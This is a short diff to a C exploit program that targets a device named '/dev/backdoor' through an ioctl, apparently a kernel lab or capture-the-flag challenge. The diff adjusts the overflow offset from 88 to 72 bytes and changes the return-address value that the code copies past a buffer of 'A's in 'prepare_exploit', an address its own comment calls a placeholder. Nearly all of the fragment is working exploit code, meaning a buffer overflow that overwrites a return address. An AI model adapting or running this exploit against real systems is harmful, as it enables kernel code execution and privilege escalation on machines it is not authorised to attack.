@@ -7,7 +7,7 @@
 
 #define DEVICE "/dev/backdoor"
 #define IOCTL_CMD 100
-#define BUFFER_SIZE 88
+#define BUFFER_SIZE 72
 
 void prepare_exploit(char *buffer) {
     // Fill the buffer with 'A's
@@ -15,7 +15,7 @@ void prepare_exploit(char *buffer) {
 
     // Overwrite the return address - this address would need to be adjusted
     // for the specific environment, this is a placeholder.
-    void (*backdoor_address)() = (void (*)())0xffffffc0000010; // Replace with actual address
+    void (*backdoor_address)() = (void (*)())0xffffffffc0000000; // Replace with actual address
     memcpy(buffer + BUFFER_SIZE, &backdoor_address, sizeof(backdoor_address));
 }
 
